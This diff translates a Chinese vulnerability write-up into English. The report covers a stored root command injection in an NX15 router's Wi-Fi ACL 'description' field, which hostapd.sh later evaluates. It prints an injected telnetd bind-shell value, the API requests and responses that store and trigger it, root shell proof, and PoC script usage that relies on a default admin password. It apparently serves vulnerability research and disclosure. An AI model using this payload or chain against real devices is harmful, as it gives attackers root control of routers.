@@ -1,43 +1,43 @@
-# NX15 R017 `esps.wifi.acl` -> `hostapd.sh` 后置存储型 root RCE
+# NX15 R017 `esps.wifi.acl` -> `hostapd.sh` Post-Authentication Stored root RCE
 
-## 1. 结论
+## 1. Conclusion
 
-在 NX15 R017 上，`/api/esps` 的：
+On NX15 R017, the following `/api/esps` handler:
 
 - `object = esps.wifi.acl`
 - `method = add` / `modify`
 
-可将攻击者控制的 payload 写入 `wireless_acl.*.description`，随后在 Wi-Fi 配置重载过程中被 `lib/wifi/hostapd.sh` 以 `eval` 执行，形成一条**已实机确认的后认证存储型 root RCE**。
+can write an attacker-controlled payload into `wireless_acl.*.description`. During a later Wi-Fi configuration reload, `/lib/wifi/hostapd.sh` executes that value through `eval`, forming a **confirmed post-authentication stored root RCE**.
 
-- **接口**：`POST /api/esps`
-- **上游对象**：`esps.wifi.acl`
-- **上游方法**：`add` / `modify`
-- **注入字段**：`description`
-- **下游 sink**：`/lib/wifi/hostapd.sh`
-- **纯 Web 触发器**：`object = esps.wifi` / `method = setssid`
-- **触发方式**：修改现有 SSID 配置（本轮用 `5G / SSID1` 的 `hide` 字段 `disable -> enable`）
-- **权限**：后认证（管理员会话）
-- **结果**：以 **root** 权限执行任意命令
-- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
-- **结论等级**：**Confirmed / Exploited**
+- **Endpoint**: `POST /api/esps`
+- **Upstream object**: `esps.wifi.acl`
+- **Upstream method**: `add` / `modify`
+- **Injection field**: `description`
+- **Downstream sink**: `/lib/wifi/hostapd.sh`
+- **Pure Web trigger**: `object = esps.wifi` / `method = setssid`
+- **Trigger method**: modify an existing SSID configuration; in this round, the `hide` field of `5G / SSID1` was changed from `disable` to `enable`
+- **Privilege requirement**: post-authentication administrator session
+- **Impact**: arbitrary command execution as **root**
+- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
+- **Status**: **Confirmed / Exploited**
 
-这条链属于典型的存储型利用：
+This chain is a typical stored exploit:
 
-> **攻击者先把 payload 持久化进 Wi-Fi ACL 配置，再等待一次正常的 Wi-Fi 配置重建动作，由系统自身在 root 上下文中执行。**
+> **The attacker first persists the payload into the Wi-Fi ACL configuration, then waits for a normal Wi-Fi configuration rebuild action, after which the system itself executes the payload in a root context.**
 
-因此它具备较强的隐蔽性与延迟触发特征。
+Therefore, it has strong stealth and delayed-trigger characteristics.
 
 ---
 
-## 2. 根因分析
+## 2. Root Cause Analysis
 
-目标脚本：
+Target script:
 
 - `/lib/wifi/hostapd.sh`
 
-### 2.1 `wireless_acl.description` 被直接 `eval`
+### 2.1 `wireless_acl.description` is directly passed to `eval`
 
-文件开头的 ACL 读取函数：
+The ACL-reading function at the beginning of the file is:
 
 ```sh
 wireless_acl_getAllitem()
@@ -55,51 +55,51 @@ wireless_acl_getAllitem()
 }
 ```
 
-对应行号：
+Corresponding line numbers:
 
 - `hostapd.sh:23-40`
-- 其中危险 sink 位于 **`hostapd.sh:28-29`**
+- The dangerous sink is located at **`hostapd.sh:28-29`**.
 
-也就是说，只要攻击者能把诸如：
+In other words, if an attacker can write a value such as:
 
 ```sh
 $(/usr/sbin/telnetd -p2482 -l/bin/sh)
 ```
 
-写入 `wireless_acl.*.description`，在该函数执行时就会被 shell 命令替换语义直接执行。
+into `wireless_acl.*.description`, it will be executed directly through shell command-substitution semantics when this function runs.
 
-### 2.2 这是实际运行路径，不是死代码
+### 2.2 This is an actual runtime path, not dead code
 
-在同一文件的 VAP 配置生成流程中：
+In the VAP configuration-generation flow in the same file:
 
 ```sh
-#获取列表
+# Get list
 idx=1
 config_load wireless_acl
 config_foreach wireless_acl_getAllitem acl-table
 ```
 
-对应行号：
+Corresponding line numbers:
 
 - `hostapd.sh:983-986`
 
-这说明只要 hostapd 配置重建 / Wi-Fi reload / 相关无线配置应用发生，就会走到这段 ACL 读取逻辑。
+This shows that whenever hostapd configuration is rebuilt, Wi-Fi is reloaded, or a related wireless configuration is applied, this ACL-reading logic is reached.
 
-### 2.3 `description` 本身并非 hostapd 所需配置字段
+### 2.3 `description` itself is not a required hostapd configuration field
 
-这也是此漏洞很“纯”的原因之一：
+This is one reason why the vulnerability is especially straightforward:
 
-- `description` 只是 ACL 备注信息；
-- 后续并不需要作为 hostapd 核心配置项输出；
-- 但脚本仍然先把它读出来再 `eval`。
+- `description` is only ACL remark information.
+- It does not need to be emitted later as a core hostapd configuration item.
+- However, the script still reads it first and passes it to `eval`.
 
-因此其根因并非复杂业务链路，而是：
+Therefore, the root cause is not a complex business chain, but:
 
-> **对不可信持久化配置字段进行了完全没有必要的 `eval`。**
+> **a completely unnecessary `eval` on an untrusted persisted configuration field.**
 
-### 2.4 上游 `esps.wifi.acl` 允许攻击者写入 `description`
+### 2.4 Upstream `esps.wifi.acl` allows attackers to write `description`
 
-运行时对象签名已确认：
+The runtime object signature has been confirmed:
 
 ```text
 'esps.wifi.acl'
@@ -107,46 +107,46 @@ config_foreach wireless_acl_getAllitem acl-table
     "modify":{"id":"Integer","mac":"String","description":"String","radio":"Array","isAllowWifi":"String"}
 ```
 
-因此攻击者可通过 Web 管理接口直接持久化 payload。
+Therefore, an attacker can directly persist a payload through the Web management interface.
 
 ---
 
-## 3. 利用链说明
+## 3. Exploit Chain Description
 
-本轮正式闭环的链路如下：
+The chain fully closed in this round is:
 
-1. 登录 `/api/login/auth` 获取管理员会话；
-2. 调用 `esps.wifi.acl.add`，把 payload 写入 `description`；
-3. 调用 `esps.wifi.acl.getlist`，确认 payload 已原样存储；
-4. 调用 `esps.wifi.getssid` 读取当前 SSID 配置；
-5. 调用 `esps.wifi.setssid` 修改一个真实 Wi-Fi 配置项，强制触发 hostapd 配置重建；
-6. `hostapd.sh` 在读取 `wireless_acl.description` 时执行 `eval`，拉起 root shell；
-7. 通过新开的 telnet 端口验证 root；
-8. 删除恶意 ACL 项并恢复原 Wi-Fi 配置，完成清理。
+1. Log in to `/api/login/auth` to obtain an administrator session.
+2. Call `esps.wifi.acl.add` to write the payload into `description`.
+3. Call `esps.wifi.acl.getlist` to confirm that the payload is stored verbatim.
+4. Call `esps.wifi.getssid` to read the current SSID configuration.
+5. Call `esps.wifi.setssid` to modify a real Wi-Fi configuration item and force a hostapd configuration rebuild.
+6. When `hostapd.sh` reads `wireless_acl.description`, it executes `eval` and starts a root shell.
+7. Verify root through the newly opened telnet port.
+8. Delete the malicious ACL entry and restore the original Wi-Fi configuration to complete cleanup.
 
-本轮用于落地的最短 payload：
+The shortest payload used in this round was:
 
 ```sh
 $(/usr/sbin/telnetd -p2482 -l/bin/sh)
 ```
 
-该 payload 会在命中 sink 时直接启动一个 root `telnetd`。
+When it reaches the sink, this payload directly starts a root `telnetd`.
 
 ---
 
-## 4. 动态验证
+## 4. Dynamic Verification
 
-### 4.1 初始状态
+### 4.1 Initial state
 
-在恢复后的测试设备上，先确认：
+On the restored test device, first confirm that:
 
-- `esps.wifi.acl.getlist` 返回空列表；
-- `5G / SSID1` 的 `hide = disable`；
-- `192.168.8.1:2482` 关闭。
+- `esps.wifi.acl.getlist` returns an empty list.
+- `hide = disable` for `5G / SSID1`.
+- `192.168.8.1:2482` is closed.
 
-### 4.2 写入存储 payload
+### 4.2 Write the stored payload
 
-请求：
+Request:
 
 ```json
 [
@@ -164,23 +164,23 @@ $(/usr/sbin/telnetd -p2482 -l/bin/sh)
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":1,"result":{"message":"Success","data":[],"code":0}}]
 ```
 
-随后读取：
+Then read it back:
 
 ```json
 [{"id":2,"result":{"message":"Success","data":{"count":1,"list":[{"mac":"02:11:22:33:44:55","isAllowWifi":"false","description":"$(/usr/sbin/telnetd -p2482 -l/bin/sh)","id":0,"radio":["2.4G","5G"]}]},"code":0}}]
 ```
 
-说明 payload 已被**原样写入持久化配置**。
+This shows that the payload has been **written verbatim into persistent configuration**.
 
-### 4.3 纯 Web 触发：`esps.wifi.setssid`
+### 4.3 Pure Web trigger: `esps.wifi.setssid`
 
-先读取当前 SSID：
+First read the current SSID configuration:
 
 ```json
 [{"id":1,"result":{"message":"Success","data":{"list":[
@@ -189,7 +189,7 @@ $(/usr/sbin/telnetd -p2482 -l/bin/sh)
 ]}}]
 ```
 
-然后仅修改 `5G / SSID1` 的 `hide`：
+Then modify only the `hide` field of `5G / SSID1`:
 
 ```json
 [
@@ -222,15 +222,15 @@ $(/usr/sbin/telnetd -p2482 -l/bin/sh)
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":21,"result":{"message":"Success","data":[],"code":0}}]
 ```
 
-### 4.4 Root shell 证明
+### 4.4 Root shell proof
 
-`setssid` 返回成功后，`192.168.8.1:2482` 打开。直接连接后得到 BusyBox shell，并验证：
+After `setssid` returned successfully, `192.168.8.1:2482` opened. Connecting to it directly produced a BusyBox shell, and the following proof was obtained:
 
 ```text
 uid=0(root) gid=0(root)
@@ -238,21 +238,21 @@ Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
 31339 root      1656 S    /usr/sbin/telnetd -p2482 -l/bin/sh
 ```
 
-这直接证明：
+This directly proves that:
 
-1. payload 已经在设备上执行；
-2. 执行上下文为 **root**；
-3. 触发动作完全来自 Web 管理接口，不依赖已有 shell。
+1. The payload executed on the device.
+2. The execution context was **root**.
+3. The trigger action came entirely from the Web management interface and did not depend on an existing shell.
 
 ---
 
-## 5. 清理与恢复
+## 5. Cleanup and Restoration
 
-为避免影响后续测试，本轮在验证成功后立即做了清理：
+To avoid affecting later tests, cleanup was performed immediately after successful verification.
 
-### 5.1 删除恶意 ACL 条目
+### 5.1 Delete the malicious ACL entry
 
-请求：
+Request:
 
 ```json
 [
@@ -267,45 +267,45 @@ Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
 ]
 ```
 
-返回：
+Response:
 
 ```json
 [{"id":9,"result":{"message":"Success","data":[],"code":0}}]
 ```
 
-### 5.2 恢复 5G/SSID1 的 `hide = disable`
+### 5.2 Restore `hide = disable` for 5G/SSID1
 
-再次调用 `esps.wifi.setssid` 把之前切到 `enable` 的 `hide` 恢复为 `disable`，读取回显确认恢复成功。
+`esps.wifi.setssid` was called again to restore the previously changed `hide` value from `enable` back to `disable`, and the echoed configuration was read back to confirm successful restoration.
 
-### 5.3 关闭临时 root telnetd
+### 5.3 Stop the temporary root telnetd
 
-在已拿到的 shell 中 kill 掉 `/usr/sbin/telnetd -p2482 -l/bin/sh` 后，确认：
+After killing `/usr/sbin/telnetd -p2482 -l/bin/sh` from the obtained shell, the following was confirmed:
 
-- `192.168.8.1:2482` 已关闭；
-- `esps.wifi.acl.getlist` 返回：
+- `192.168.8.1:2482` was closed.
+- `esps.wifi.acl.getlist` returned:
 
 ```json
 [{"id":30,"result":{"message":"Success","data":{"count":0,"list":[]},"code":0}}]
 ```
 
-因此本轮验证结束时，设备已恢复到：
+Therefore, at the end of this verification round, the device had been restored to the following state:
 
-- Wi-Fi ACL 恶意项已删除；
-- 5G `hide` 已恢复；
-- 临时 shell 端口已关闭。
+- The malicious Wi-Fi ACL entry had been deleted.
+- The 5G `hide` setting had been restored.
+- The temporary shell port had been closed.
 
 ---
 
-## 6. 影响评估
+## 6. Impact Assessment
 
-该漏洞的安全影响为：
+The security impact of this vulnerability is:
 
-- 管理员权限攻击者可获得 **root RCE**；
-- payload 可先存储、后触发，具备延迟执行和隐蔽性；
-- 触发条件是普通无线配置变更或系统重启等正常运维动作；
-- 因为 payload 持久化在配置中，所以即使攻击者暂时失去会话，后续仍可等待管理员或系统自行触发。
+- An attacker with administrator privileges can obtain **root RCE**.
+- The payload can be stored first and triggered later, providing delayed execution and stealth.
+- The trigger condition can be an ordinary wireless configuration change or a normal operational action such as a system reboot.
+- Because the payload is persisted in configuration, even if the attacker temporarily loses the session, they can still wait for an administrator or the system to trigger it later.
 
-可将其归类为：
+It can be classified as:
 
 > **Post-auth stored command injection / stored root RCE**
 
@@ -315,7 +315,7 @@ Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
 
 - `poc/postauth_esps_wifi_acl_hostapd_reload_rce.py`
 
-推荐直接使用已验证的纯 Web 触发方式：
+It is recommended to use the verified pure Web trigger directly:
 
 ```bash
 python3 poc/postauth_esps_wifi_acl_hostapd_reload_rce.py \
@@ -327,21 +327,21 @@ python3 poc/postauth_esps_wifi_acl_hostapd_reload_rce.py \
   --port 2482
 ```
 
-若当前 Web 管理密码不是默认 `admin123`，补充：
+If the current Web management password is not the default `admin123`, add:
 
 ```bash
 --password '<CURRENT_WEB_PASSWORD>'
 ```
 
-该 PoC 的默认行为是：
+The default behavior of this PoC is:
 
-1. 登录 Web 管理口；
-2. 向 `esps.wifi.acl.add` 写入恶意 `description`；
-3. 调用 `esps.wifi.acl.getlist` 确认 payload 已落盘；
-4. 通过 `esps.wifi.setssid` 切换指定 SSID 的 `hide` 字段，触发 `hostapd.sh` 配置重建；
-5. 连接临时 root shell 端口验证执行结果；
-6. 按参数清理 ACL 恶意项、恢复 SSID 配置并关闭临时 `telnetd`。
+1. Log in to the Web management interface.
+2. Write a malicious `description` through `esps.wifi.acl.add`.
+3. Call `esps.wifi.acl.getlist` to confirm that the payload has been written to persistent storage.
+4. Toggle the `hide` field of the specified SSID through `esps.wifi.setssid`, triggering a `hostapd.sh` configuration rebuild.
+5. Connect to the temporary root shell port and verify execution.
+6. Clean up the malicious ACL entry, restore the SSID configuration, and stop the temporary `telnetd` according to the provided options.
 
-## 8. 结论
+## 8. Conclusion
 
-该漏洞已经确认可通过纯 Web 管理面完成完整利用：攻击者把 payload 写入 `wireless_acl.description`，再通过一次正常的 `esps.wifi.setssid` 配置应用触发 `hostapd.sh` 中的 `eval`，最终以 root 身份执行任意命令。
+This vulnerability has been confirmed to be fully exploitable through the pure Web management interface. The attacker writes a payload into `wireless_acl.description`, then triggers the `eval` in `hostapd.sh` through a normal `esps.wifi.setssid` configuration application, ultimately executing arbitrary commands as root.
